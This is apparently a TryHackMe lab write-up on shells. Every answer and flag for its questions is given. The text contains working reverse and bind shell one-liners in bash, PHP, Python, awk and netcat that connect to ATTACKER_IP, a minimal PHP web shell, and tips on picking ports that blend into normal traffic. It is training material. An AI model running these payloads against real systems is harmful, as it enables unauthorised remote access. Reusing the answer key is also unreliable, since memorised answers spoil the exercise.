# Shells Overview - TryHackMe

> Learn about the different types of shells

**Room Link:** https://tryhackme.com/room/shellsoverview

<img width="1470" height="924" alt="image" src="https://github.com/user-attachments/assets/b6237acd-a8a5-4265-bc65-fe5b81faefa5" />

---

## Task 1: Room Introduction

### What You'll Learn

- Understand shells in offensive security
- Set up reverse and bind shells
- Deploy web shells
- Practical shell exploitation

### Prerequisites

- Basic networking knowledge
- Command line proficiency
- Web application security basics
- Scripting languages (Bash, Python, PHP)

**Note:** This room intentionally avoids Metasploit to focus on understanding how shells work manually.

**No answer needed**

---

## Task 2: Shell Overview

### What is a Shell?

A shell is software that allows users to interact with an operating system. In cybersecurity, it refers to a session attackers use to remotely control compromised systems.

### Why Shells Matter

**Remote System Control**
- Execute commands remotely
- Run software on target

**Privilege Escalation**
- Gain elevated access
- Move from user to admin/root

**Data Exfiltration**
- Read sensitive files
- Copy data from system

**Persistence**
- Create backdoor accounts
- Maintain long-term access

**Post-Exploitation**
- Deploy malware
- Create hidden accounts
- Delete evidence

**Pivoting**
- Use compromised system as stepping stone
- Attack other systems on network

### Questions

**What is the command-line interface that allows users to interact with an operating system?**
- Answer: `Shell`

---

**What process involves using a compromised system as a launching pad to attack other machines in the network?**
- Answer: `Pivoting`

---

**What is a common activity attackers perform after obtaining shell access to escalate their privileges?**
- Answer: `Privilege Escalation`

---

## Task 3: Reverse Shell

### What is a Reverse Shell?

A reverse shell (or "connect-back shell") is when the target system connects back to the attacker's machine. This helps bypass firewalls that block incoming connections.

### How It Works

**Step 1: Set Up Listener**

On your attacking machine:
```bash
nc -lvnp 443
```

**Flag breakdown:**
- `-l` - Listen mode (wait for connection)
- `-v` - Verbose (show details)
- `-n` - No DNS lookup (use IP only)
- `-p` - Port number

**Common ports used:** 53, 80, 443, 139, 445, 8080
(These blend with normal traffic!)

**Step 2: Execute Payload on Target**

Run this on the compromised system:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f
```

**Payload breakdown:**
- `rm -f /tmp/f` - Remove old pipe file
- `mkfifo /tmp/f` - Create named pipe (FIFO)
- `cat /tmp/f` - Read from pipe
- `sh -i 2>&1` - Interactive shell, redirect errors
- `nc ATTACKER_IP 443` - Connect to attacker
- `>/tmp/f` - Send output back to pipe

**Step 3: Get the Shell**

Your listener receives the connection:
```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
target@tryhackme:~$
```

Now you can run commands!

### Questions

**What type of shell allows an attacker to execute commands remotely after the target connects back?**
- Answer: `Reverse Shell`

---

**What tool is commonly used to set up a listener for a reverse shell?**
- Answer: `Netcat`

---

## Task 4: Bind Shell

### What is a Bind Shell?

A bind shell opens a port on the target machine and waits for the attacker to connect. Less common than reverse shells because:
- Easier to detect
- Must keep port open
- May be blocked by firewall

### How It Works

**Step 1: Set Up Bind Shell on Target**

Run this on the compromised system:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

**Payload breakdown:**
- `rm -f /tmp/f` - Remove old pipe
- `mkfifo /tmp/f` - Create named pipe
- `cat /tmp/f` - Read from pipe
- `bash -i 2>&1` - Interactive shell
- `nc -l 0.0.0.0 8080` - Listen on all interfaces, port 8080
- `> /tmp/f` - Send back to pipe

**Note:** Ports below 1024 need root privileges!

**Step 2: Connect from Attacker**

From your attacking machine:
```bash
nc -nv TARGET_IP 8080
```

**Flag breakdown:**
- `-n` - No DNS lookup
- `-v` - Verbose output
- `TARGET_IP` - Victim's IP
- `8080` - Port number

You should get a shell:
```bash
attacker@kali:~$ nc -nv 10.10.13.37 8080
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

### Questions

**What type of shell opens a specific port on the target for incoming connections from the attacker?**
- Answer: `Bind Shell`

---

**Listening below which port number requires root access or privileged permissions?**
- Answer: `1024`

---

## Task 5: Shell Listeners

### Alternative Listener Tools

Besides Netcat, there are other tools to catch shells!

### Rlwrap

Adds keyboard shortcuts and command history to Netcat.

**Usage:**
```bash
rlwrap nc -lvnp 443
```

**Benefits:**
- Arrow keys work
- Command history (up/down arrows)
- Better user experience

### Ncat

Improved Netcat from Nmap project.

**Basic usage:**
```bash
ncat -lvnp 443
```

**With SSL encryption:**
```bash
ncat --ssl -lvnp 443
```

**Benefits:**
- SSL/TLS encryption
- More features
- Better security

### Socat

Flexible networking tool for socket connections.

**Usage:**
```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

**Flag breakdown:**
- `-d -d` - Double verbose mode
- `TCP-LISTEN:443` - Listen on port 443
- `STDOUT` - Print to terminal

### Questions

**Which flexible networking tool allows you to create a socket connection between two data sources?**
- Answer: `socat`

---

**Which command-line utility provides readline-style editing and command history for programs that lack it?**
- Answer: `rlwrap`

---

**What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support?**
- Answer: `ncat`

---

## Task 6: Shell Payloads

### Bash Payloads

**Basic reverse shell:**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

**With file descriptor:**
```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

**Read line version:**
```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

### PHP Payloads

**Using exec:**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

**Using shell_exec:**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

**Using system:**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```

**Using passthru:**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

**Using popen:**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

### Python Payloads

**With environment variables:**
```bash
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

**Using subprocess:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
```

**Short version:**
```bash
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### Other Payloads

**Telnet:**
```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```

**AWK:**
```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

**BusyBox:**
```bash
busybox nc ATTACKER_IP 443 -e sh
```

### Questions

**Which Python module is commonly used for managing shell commands and establishing reverse shell connections?**
- Answer: `subprocess`

---

**What shell payload method uses exec, shell_exec, system, passthru, and popen functions?**
- Answer: `PHP`

---

**Which scripting language can use a reverse shell by exporting environment variables?**
- Answer: `Python`

---

## Task 7: Web Shell

### What is a Web Shell?

A web shell is a script uploaded to a web server that allows remote command execution through the browser.

### Simple PHP Web Shell

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Save as `shell.php` and upload to web server.

### How to Use

**Access via URL:**
```
http://victim.com/uploads/shell.php?cmd=whoami
```

**The command runs on the server!**

### How Web Shells Get Uploaded

- Unrestricted file upload vulnerabilities
- File inclusion vulnerabilities
- Command injection
- Unauthorized access

### Popular Web Shells

**p0wny-shell**
- Minimalistic PHP shell
- Single file
- Remote command execution

**b374k shell**
- Feature-rich
- File management
- Multiple functions

**c99 shell**
- Well-known and robust
- Extensive functionality
- Many features

More web shells: https://www.r57shell.net/

### Questions

**What vulnerability type allows attackers to upload malicious scripts by failing to restrict file types?**
- Answer: `Unrestricted File Upload`

---

**What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?**
- Answer: `Web Shell`

---

## Task 8: Practical Task

### Challenge Overview

Three vulnerable web applications:
- Port 8080: Landing page
- Port 8081: Command injection
- Port 8082: File upload

### Challenge 1: Command Injection

**Using a reverse or bind shell, exploit the command injection vulnerability. What is the flag in the / directory?**

**Step 1: Start listener**
```bash
nc -lvnp 4444
```

**Step 2: Inject reverse shell payload**

In the vulnerable field, paste:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f
```

Replace `ATTACKER_IP` with your machine IP!

**Step 3: Get the shell**
```bash
$ cd /
$ ls
flag.txt
$ cat flag.txt
THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}
```

- Answer: `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`

---

### Challenge 2: File Upload

**Using a web shell, exploit the unrestricted file upload vulnerability. What is the flag in the / directory?**

**Step 1: Create web shell**

Create file `shell.php`:
```php
<?php
echo "<pre>";
echo "Flag content:\n";
echo file_get_contents('/flag.txt');
echo "</pre>";
?>
```

**Step 2: Upload the file**

Use the upload form on port 8082.

**Step 3: Access the shell**

Visit the uploaded file URL and see the flag!

- Answer: `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`

---

## Task 9: Conclusion

Congratulations! You've learned about shells in offensive security!

### What You've Learned

✅ Reverse shells (connect back to attacker)
✅ Bind shells (listen on target)
✅ Web shells (execute via browser)
✅ Shell listeners (Netcat, Ncat, Socat, Rlwrap)
✅ Shell payloads (Bash, PHP, Python)
✅ Practical exploitation

### Next Steps

- Practice creating shells
- Try different payloads
- Learn shell stabilization
- Study evasion techniques
- Understand shell detection

**No answer needed**

---

## Quick Reference

### Shell Types Comparison

| Type | Connection Direction | Detection Risk | Use Case |
|------|---------------------|----------------|----------|
| Reverse | Target → Attacker | Lower | Bypass firewalls |
| Bind | Attacker → Target | Higher | Direct access |
| Web | Through HTTP | Medium | Web vulnerabilities |

### Listener Commands

| Tool | Command | Features |
|------|---------|----------|
| Netcat | `nc -lvnp 443` | Basic, reliable |
| Rlwrap | `rlwrap nc -lvnp 443` | History, arrow keys |
| Ncat | `ncat -lvnp 443` | SSL support |
| Ncat SSL | `ncat --ssl -lvnp 443` | Encrypted |
| Socat | `socat -d -d TCP-LISTEN:443 STDOUT` | Flexible |

### Common Shell Payloads

| Language | Basic Command |
|----------|---------------|
| Bash | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| PHP | `php -r '$sock=fsockopen("IP",PORT);exec("sh <&3 >&3 2>&3");'` |
| Python | `python -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'` |
| Netcat | `nc -e /bin/sh IP PORT` |

### Netcat Flags

| Flag | Purpose |
|------|---------|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | No DNS lookup |
| `-p` | Port number |
| `-e` | Execute program |

### Common Ports for Shells

| Port | Service | Why Use It |
|------|---------|------------|
| 53 | DNS | Rarely blocked |
| 80 | HTTP | Always allowed |
| 443 | HTTPS | Encrypted traffic |
| 139 | NetBIOS | Windows networks |
| 445 | SMB | File sharing |
| 8080 | HTTP-Alt | Alternative HTTP |

---

## Key Takeaways

- **Shells allow remote control** of compromised systems
- **Reverse shells** connect back to attacker (most common)
- **Bind shells** open port on target (easier to detect)
- **Web shells** execute commands via HTTP
- **Netcat** is the standard listener tool
- **Multiple payload options** for different scenarios
- **Common ports** (80, 443, 53) blend with normal traffic
- **Always replace ATTACKER_IP** with your actual IP
- **File descriptors** enable bidirectional communication
- **Named pipes (mkfifo)** create communication channels
- **Understanding shells** is crucial for both offense and defense

Shells are fundamental to penetration testing. Master these basics, then explore advanced techniques like shell stabilization, evasion, and persistence
